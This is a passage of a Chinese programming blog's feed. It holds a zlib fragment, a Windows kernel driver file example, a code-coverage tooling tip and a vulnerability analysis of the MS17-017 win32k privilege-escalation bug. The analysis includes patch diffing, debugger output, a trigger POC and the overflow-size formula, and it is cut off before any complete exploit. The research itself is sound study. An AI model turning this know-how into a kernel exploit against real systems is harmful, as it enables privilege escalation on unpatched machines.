pCompressData;</span><br><span class="line">pCompressData = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>项目用到的相关代码<a href="https://github.com/yeanhoo/codebank/tree/main/zlibuse" target="_blank" rel="noopener">点击下载</a></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/myzip.gif" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;使用ZLIB库压缩与解压缩&quot;&gt;&lt;a href=&quot;#使用ZLIB库压缩与解压缩&quot; class=&quot;headerlink&quot; title=&quot;使用ZLIB库压缩与解压缩&quot;&gt;&lt;/a&gt;使用ZLIB库压缩与解压缩&lt;/h2&gt;&lt;h3 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; cla
      
    
    </summary>
    
    
      <category term="C\C++" scheme="http://yeanhoo.gitee.io/categories/C-C/"/>
    
    
      <category term="ZLIB库" scheme="http://yeanhoo.gitee.io/tags/ZLIB%E5%BA%93/"/>
    
      <category term="压缩与解压缩" scheme="http://yeanhoo.gitee.io/tags/%E5%8E%8B%E7%BC%A9%E4%B8%8E%E8%A7%A3%E5%8E%8B%E7%BC%A9/"/>
    
  </entry>
  
  <entry>
    <title>驱动操作磁盘文件</title>
    <link href="http://yeanhoo.gitee.io/2020/12/24/%E9%A9%B1%E5%8A%A8%E6%93%8D%E4%BD%9C%E7%A3%81%E7%9B%98%E6%96%87%E4%BB%B6/"/>
    <id>http://yeanhoo.gitee.io/2020/12/24/%E9%A9%B1%E5%8A%A8%E6%93%8D%E4%BD%9C%E7%A3%81%E7%9B%98%E6%96%87%E4%BB%B6/</id>
    <published>2020-12-24T15:38:36.759Z</published>
    <updated>2020-12-24T15:29:23.853Z</updated>
    
    <content type="html"><![CDATA[<h2 id="驱动操作磁盘文件"><a href="#驱动操作磁盘文件" class="headerlink" title="驱动操作磁盘文件"></a>驱动操作磁盘文件</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">UnLoadDriver</span><span class="params">(PDRIVER_OBJECT pDriverObject)</span></span>;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverDefaultHandle</span><span class="params">(PDEVICE_OBJECT pDevObj,PIRP pIrp)</span></span>;</span><br><span class="line"><span class="function">BOOLEAN <span class="title">MyQueryFileAndFileFolder</span><span class="params">(UNICODE_STRING ustrPath)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject,PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DbgPrint(<span class="string">"Driver Start"</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; IRP_MJ_MAXIMUM_FUNCTION;i++)</span><br><span class="line">&#123;</span><br><span class="line">DriverObject-&gt;MajorFunction[i] = DriverDefaultHandle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历文件</span></span><br><span class="line">UNICODE_STRING ustrQueryaFile;</span><br><span class="line">RtlInitUnicodeString(&amp;ustrQueryaFile,<span class="string">L"\\??\\C:\\yeanhoo"</span>);</span><br><span class="line">MyQueryFileAndFileFolder(ustrQueryaFile);</span><br><span class="line"></span><br><span class="line">DriverObject-&gt;DriverUnload = UnLoadDriver;</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">UnLoadDriver</span><span class="params">(PDRIVER_OBJECT pDriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DbgPrint(<span class="string">"UnloadDriver success!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverDefaultHandle</span><span class="params">(PDEVICE_OBJECT pDevObj,PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">pIrp-&gt;IoStatus.Status = status;</span><br><span class="line">pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">IoCompleteRequest(pIrp,IO_NO_INCREMENT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">MyQueryFileAndFileFolder</span><span class="params">(UNICODE_STRING ustrPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line">OBJECT_ATTRIBUTES objectAttributes = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">IO_STATUS_BLOCK iosb = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">InitializeObjectAttributes(&amp;objectAttributes,&amp;ustrPath,OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">status = ZwCreateFile(&amp;hFile,GENERIC_READ,&amp;objectAttributes,&amp;iosb,<span class="literal">NULL</span>,FILE_ATTRIBUTE_NORMAL,<span class="number">0</span>,FILE_OPEN_IF,FILE_SYNCHRONOUS_IO_NONALERT,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!NT_SUCCESS(status))</span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">"function err!"</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">ZwClose(hFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;驱动操作磁盘文件&quot;&gt;&lt;a href=&quot;#驱动操作磁盘文件&quot; class=&quot;headerlink&quot; title=&quot;驱动操作磁盘文件&quot;&gt;&lt;/a&gt;驱动操作磁盘文件&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas
      
    
    </summary>
    
    
      <category term="C\C++" scheme="http://yeanhoo.gitee.io/categories/C-C/"/>
    
    
      <category term="驱动程序" scheme="http://yeanhoo.gitee.io/tags/%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F/"/>
    
      <category term="文件操作" scheme="http://yeanhoo.gitee.io/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    
  </entry>
  
  <entry>
    <title>IDA+DynameRIO+lighthouse</title>
    <link href="http://yeanhoo.gitee.io/2020/12/24/IDA+DynameRIO+lighthouse/"/>
    <id>http://yeanhoo.gitee.io/2020/12/24/IDA+DynameRIO+lighthouse/</id>
    <published>2020-12-24T15:38:30.468Z</published>
    <updated>2020-12-24T16:19:14.864Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IDA-DynameRIO-lighthouse"><a href="#IDA-DynameRIO-lighthouse" class="headerlink" title="IDA+DynameRIO+lighthouse"></a>IDA+DynameRIO+lighthouse</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>IDA使用lighthouse插件可将DynameRIO生成的程序代码执行记录导入IDA并高亮显示。</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>点击下载<a href="https://github.com/DynamoRIO/dynamorio" target="_blank" rel="noopener">DynameRIO</a></p><p>点击下载<a href="https://github.com/gaasedelen/lighthouse" target="_blank" rel="noopener">lighthouse</a></p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>按照GitHub提示安装lighthouse插件</p><p>使用命令记录程序执行记录</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drrun  –t  drcov  -<span class="literal">-test</span>.exe</span><br></pre></td></tr></table></figure><p>将log文件导入IDA</p><p>file–&gt;Load file–&gt;Code coverage file</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/loadfile1.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;IDA-DynameRIO-lighthouse&quot;&gt;&lt;a href=&quot;#IDA-DynameRIO-lighthouse&quot; class=&quot;headerlink&quot; title=&quot;IDA+DynameRIO+lighthouse&quot;&gt;&lt;/a&gt;IDA+DynameRIO+
      
    
    </summary>
    
    
      <category term="技巧" scheme="http://yeanhoo.gitee.io/categories/%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="DynameRIO" scheme="http://yeanhoo.gitee.io/tags/DynameRIO/"/>
    
      <category term="lighthouse" scheme="http://yeanhoo.gitee.io/tags/lighthouse/"/>
    
  </entry>
  
  <entry>
    <title>ms17-017提权漏洞</title>
    <link href="http://yeanhoo.gitee.io/2020/12/24/ms17-017%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yeanhoo.gitee.io/2020/12/24/ms17-017%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-12-24T15:38:16.796Z</published>
    <updated>2020-12-24T16:20:14.618Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ms17-017提权漏洞"><a href="#ms17-017提权漏洞" class="headerlink" title="ms17-017提权漏洞"></a>ms17-017提权漏洞</h2><h3 id="Microsoft-Windows-Transaction-Manager-权限许可和访问控制漏洞"><a href="#Microsoft-Windows-Transaction-Manager-权限许可和访问控制漏洞" class="headerlink" title="Microsoft Windows Transaction Manager 权限许可和访问控制漏洞"></a>Microsoft Windows Transaction Manager 权限许可和访问控制漏洞</h3><ul><li>CNNVD编号：CNNVD-201703-757</li><li>危害等级： 中危 </li><li>CVE编号： <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0101" target="_blank" rel="noopener">CVE-2017-0101</a></li><li>漏洞类型： 缓冲区溢出</li><li>发布时间： <a href="http://www.cnnvd.org.cn/web/vulnerability/querylist.tag?qstartdateXq=2017-03-20" target="_blank" rel="noopener">2017-03-20</a></li><li>威胁类型： 远程</li><li>更新时间： <a href="http://www.cnnvd.org.cn/web/vulnerability/querylist.tag?cvCnnvdUpdatedateXq=2017-03-20" target="_blank" rel="noopener">2017-03-20</a></li><li>厂    商： <a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201703-757#" target="_blank" rel="noopener">microsoft</a></li></ul><h3 id="受影响实体"><a href="#受影响实体" class="headerlink" title="受影响实体"></a>受影响实体</h3><ul><li>Microsoft Windows_10 </li><li>Microsoft Windows_10:1511 </li><li>Microsoft Windows_10:1607 </li><li>Microsoft Windows_7:SP1 </li><li>Microsoft Windows_8.1 </li><li>Microsoft Windows_Rt_8.1</li><li>Microsoft Windows_server_2008:SP2 </li><li>Microsoft Windows_server_2008:R2 </li><li>Microsoft Windows_server_2012:R2 </li><li>Microsoft Windows_vista:SP2 </li></ul><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><hr><h4 id="模块对比"><a href="#模块对比" class="headerlink" title="模块对比"></a>模块对比</h4><p>实验环境为<code>win7 32bit SP1</code>，<a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-017" target="_blank" rel="noopener">下载ms17-017对应的kb4012212补丁包</a>，使用<code>expand</code>命令提取补丁文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expand -F:* Windows6<span class="number">.1</span>-KB4012212-x86.cab  c:\path</span><br></pre></td></tr></table></figure><p>找到补丁包中对应更新的<code>win32k.sys</code>程序,查看版本为<code>6.1.7601.23677</code>，查找最接近该模块的<a href="https://www.pconlife.com/searchfile/windowsosfile/" target="_blank" rel="noopener">历史版本</a>为<code>6.1.7601.23591</code></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-1.png" alt></p><p>使用<a href="https://www.zynamics.com/software.html" target="_blank" rel="noopener">BinDiff</a>分析漏洞补丁，找到存在漏洞的函数<code>EngRealizeBrush</code></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-2.png" alt></p><h4 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h4><p>IDA分析<code>EngRealizeBrush</code>函数，对比新旧版本差异,新版本的<code>win32k.sys</code>内增加了<code>ULongLongToULong</code>和<code>ULongAdd</code>函数防止<code>PALLOCMEM</code>申请tag为<code>”Gebr”</code>的内存时产生整型溢出，<code>PALLOCMEM</code>函数第一个参数为申请内存的大小</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-3.png" alt></p><p><code>PALLOCMEM</code>函数内容如下，因此可以尝试从v12(形参中Size的来源)变量切入分析</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">Pallocmem</span><span class="params">(DWORD Size, <span class="keyword">char</span> *szFileName,  DWORD nLine)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PVOID v2; <span class="comment">// esi</span></span><br><span class="line">  PVOID v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( Size )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = Win32AllocPool(Size, Tag);<span class="comment">//导致异常</span></span><br><span class="line">    v2 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">      <span class="built_in">memset</span>(v3, <span class="number">0</span>, Size);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<a href="https://doxygen.reactos.org/d3/d6d/engbrush_8c.html#aec8914e48b3178356b03f34e47af4346" target="_blank" rel="noopener">ReactOS</a>中查看<code>EngRealizeBrush</code>函数原型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">EngRealizeBrush</span><span class="params">(BRUSHOBJ * pbo,<span class="comment">//[in]指向BRUSHOBJ的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">                                 SURFOBJ * psoDst,<span class="comment">//[in]指向要实现画笔的表面的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">                                 SURFOBJ * psoPattern,<span class="comment">//[in]指向描述画笔图案的表面的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">                                 SURFOBJ * psoMask,<span class="comment">//[in]指向画笔的透明蒙版的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">                                 XLATEOBJ * pxlo,<span class="comment">//[in]指向XLATEOBJ的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">                                 ULONG iHatch <span class="comment">//[in]指示psoPattern参数是否为DrvEnablePDEV返回的阴影线之一</span></span></span></span><br><span class="line"><span class="function"><span class="params">                                )</span></span></span><br></pre></td></tr></table></figure><p><code>EngRealizeBrush</code>参数中<code>SURFOBJ</code>结构体内容如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SURFOBJ</span> &#123;</span></span><br><span class="line">  DHSURF dhsurf;<span class="comment">//表面的句柄，前提是该表面受设备管理</span></span><br><span class="line">  HSURF  hsurf;<span class="comment">//表面的句柄</span></span><br><span class="line">  DHPDEV dhpdev;<span class="comment">//标识与指定表面关联的设备的PDEV</span></span><br><span class="line">  HDEV   hdev;<span class="comment">//GDI与此设备关联的PDEV的逻辑句柄</span></span><br><span class="line">  SIZEL  sizlBitmap;<span class="comment">//指定SIZEL结构，该结构包含曲面的宽度和高度（以像素为单位）。SIZEL结构与SIZE结构相同</span></span><br><span class="line">  ULONG  cjBits;<span class="comment">//指定pvBits指向的缓冲区的大小</span></span><br><span class="line">  PVOID  pvBits;<span class="comment">//如果表面是标准格式的位图，则这是指向表面像素的指针</span></span><br><span class="line">  PVOID  pvScan0;<span class="comment">//指向位图的第一条扫描线的指针</span></span><br><span class="line">  LONG   lDelta;<span class="comment">//指定在位图中向下移动一条扫描线所需的字节数</span></span><br><span class="line">  ULONG  iUniq;<span class="comment">//指定指定表面的当前状态</span></span><br><span class="line">  ULONG  iBitmapFormat;<span class="comment">//指定最接近此曲面的标准格式</span></span><br><span class="line">  USHORT iType;<span class="comment">//曲面类型STYPE_BITMAP | STYPE_DEVBITMAP | STYPE_DEVICE</span></span><br><span class="line">  USHORT fjBitmap;<span class="comment">//标志位</span></span><br><span class="line">&#125; SURFOBJ;</span><br></pre></td></tr></table></figure><p>此时根据变量v12赋值过程向上查找，发现最终影响v12的值有三个，即<code>EngRealizeBrush</code>参数中的如下内容</p><ul><li><code>a2-&gt;iBitmapFormat</code></li><li><code>a3-&gt;sizlBitmap</code></li><li><code>a4-&gt;sizlBitmap</code></li></ul><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-4.png" alt></p><h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>建立<code>windbg</code>双机调试，加载符号后在<code>win32k!EngRealizeBrush</code>尝试下硬件执行断点，尝试触发断点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; ba e1 win32k!EngRealizeBrush</span><br><span class="line"><span class="number">0</span>: kd&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line">win32k!EngRealizeBrush:</span><br><span class="line"><span class="number">9613</span>d5a0 <span class="number">8b</span>ff            mov     edi,edi</span><br><span class="line"><span class="number">0</span>: kd&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">a68b9a20 <span class="number">96140</span>c34 ffa1bd68 ffb5b6a0 de1f1010 win32k!EngRealizeBrush</span><br><span class="line">a68b9ab8 <span class="number">961434</span>af fb8308c0 ffb8a748 <span class="number">9613</span>d5a0 win32k!bGetRealizedBrush+<span class="number">0x70c</span></span><br><span class="line">a68b9ad0 <span class="number">961b</span>9ae6 ffa1bd68 ffa1bd68 ffb5b690 win32k!pvGetEngRbrush+<span class="number">0x1f</span></span><br><span class="line">a68b9b34 <span class="number">961</span>de723 ffb5b6a0 <span class="number">00000000</span> <span class="number">00000000</span> win32k!EngBitBlt+<span class="number">0x2bf</span></span><br><span class="line">a68b9b98 <span class="number">961509</span>ec ffa1bd68 a68b9bfc a68b9bec win32k!GrePatBltLockedDC+<span class="number">0x22b</span></span><br><span class="line">a68b9c14 <span class="number">83e511</span>ea <span class="number">0e010</span>dc5 <span class="number">00000100</span> <span class="number">00000010</span> win32k!NtGdiPatBlt+<span class="number">0x14c</span></span><br><span class="line">a68b9c14 <span class="number">779</span>d70b4 <span class="number">0e010</span>dc5 <span class="number">00000100</span> <span class="number">00000010</span> nt!KiFastCallEntry+<span class="number">0x12a</span></span><br><span class="line"><span class="number">0030f</span>a54 <span class="number">75f</span>66333 <span class="number">012</span>c105c <span class="number">0e010</span>dc5 <span class="number">00000100</span> ntdll!KiFastSystemCallRet</span><br><span class="line"><span class="number">0030f</span>b40 <span class="number">7760</span>ed6c <span class="number">7f</span>fde000 <span class="number">0030f</span>b8c <span class="number">779f</span>37f5 gdi32!NtGdiPatBlt+<span class="number">0xc</span></span><br><span class="line"><span class="number">0030f</span>b8c <span class="number">779f</span>37c8 <span class="number">012</span>c1ab7 <span class="number">7f</span>fde000 <span class="number">00000000</span> kernel32!BaseThreadInitThunk+<span class="number">0xe</span></span><br><span class="line"><span class="number">0030f</span>ba4 <span class="number">00000000</span> <span class="number">012</span>c1ab7 <span class="number">7f</span>fde000 <span class="number">00000000</span> ntdll!_RtlUserThreadStart+<span class="number">0x1b</span></span><br></pre></td></tr></table></figure><p>断点触发后查看调用栈信息发现由用户态进入内核态的函数为<code>GDI32!NtGdiPatBlt</code>，函数原型如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PatBlt</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HDC   hdc,<span class="comment">//设备上下文的句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>   x,<span class="comment">//要填充的矩形的左上角的x坐标（以逻辑单位为单位）</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>   y,<span class="comment">//要填充的矩形的左上角的y坐标（以逻辑单位为单位）</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>   w,<span class="comment">//矩形的宽度，以逻辑单位为单位</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>   h,<span class="comment">//矩形的高度，以逻辑单位为单位</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD rop<span class="comment">//栅格操作代码</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>在实验环境中多次尝试触发断点并观察后续函数调用，<code>PALLOCMEM</code>函数并不会每次都得到执行，查看<code>EngRealizeBrush</code>函数存在变量<code>gpCachedEngbrush</code>用来缓存上次申请的内存空间并判断如果满足当前条件不再进行内存申请</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-5.png" alt></p><p>尝试编写<code>POC</code>代码触发断点进入<code>EngRealizeBrush</code>函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HDC hdc = GetDC(<span class="literal">NULL</span>);</span><br><span class="line">HBITMAP hbmp = CreateBitmap(<span class="number">0x11</span>,<span class="number">0x111</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="literal">NULL</span>);<span class="comment">//创建位图</span></span><br><span class="line">HBRUSH hbru = CreatePatternBrush(hbmp);<span class="comment">//创建指定位图的逻辑刷</span></span><br><span class="line">SelectObject(hdc,hbru);</span><br><span class="line"></span><br><span class="line">__debugbreak();</span><br><span class="line">PatBlt(hdc,<span class="number">0x100</span>,<span class="number">0x10</span>,<span class="number">0x100</span>,<span class="number">0x100</span>,PATCOPY);<span class="comment">//指定的模式复制到目标位图中</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>win32k!EngRealizeBrush</code>下断后查看函数参数如下</p><p><code>a1–&gt;fe476d68</code></p><p><code>a2–&gt;fe522d18</code></p><p><code>a3–&gt;fde02198</code></p><p><code>a4–&gt;00000000</code></p><p>可以看到<code>EngRealizeBrush</code>的实参列表中a4总是为0，因此不再需要考虑<code>a4-&gt;sizlBitmap</code>对v12的影响(不需要考虑v12变量二次赋值的情况)，着重分析<code>a2-&gt;iBitmapFormat</code>、<code>a3-&gt;sizlBitmap</code>与v12的对应关系即可</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-6.png" alt></p><p>查看<code>a2-&gt;iBitmapFormat</code>对应值为6h,查看<code>a3-&gt;sizlBitmap</code>对应值(11h,111h)</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-7.png" alt></p><p>此时在<code>win32k!PALLOCMEM</code>函数下硬件执行断点并触发，PALLOCMEM<code>申请缓存区的大小为</code>0x4908h</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-8.png" alt></p><p>梳理v12计算公式如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v12=v59 * v68 + <span class="number">0x44</span>; </span><br><span class="line"></span><br><span class="line">v68=a3(_SURFOBJ psoPattern)<span class="number">-16</span>+<span class="number">9</span>*<span class="number">4</span>==sizlBitmap.cy=<span class="number">111</span>h</span><br><span class="line">    </span><br><span class="line">v59 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v11 * v8) &gt;&gt; <span class="number">3</span>;  </span><br><span class="line"></span><br><span class="line">v11=<span class="number">0x20</span>h，<span class="comment">//(当a2-&gt;iBitmapFormat大于5时)</span></span><br><span class="line"></span><br><span class="line">v8=a3-&gt;sizlBitmap.cx=<span class="number">11</span>h</span><br></pre></td></tr></table></figure><p>那么v12应该为<code>((v11 * v8) &gt;&gt; 3)*v68 + 0x44=48c8h</code>,与动态调试结果一致(4908h，这是由于最终申请内存为v12+40h)</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-9.png" alt></p><p>优化公式为<code>PALLOCMEM</code>函数所申请内存的计算公式</p><p><strong>Size = ((20h*a3-&gt;sizlBitmap.cx)&gt;&gt;3)*a3-&gt;sizlBitmap.cy+44h+40h</strong></p><p>在调试时发现<code>PALLOCMEM</code>申请的内存转换为<code>ENGBRUSH</code>结构体，对照<code>windows</code>老版本操作系统源码发现IDA此处确实识别有差异</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/ms17-017-10.png" alt></p><p>通过对比老版本系统源码查看内容有偏差，IDA中添加自定义结构体<code>PENGBRUSH</code>并将<code>PALLOCMEM</code>函数申请到的内存转换为<code>PENGBRUSH</code>结构体类型</p><figure class="highlight c++"><table><tr><td 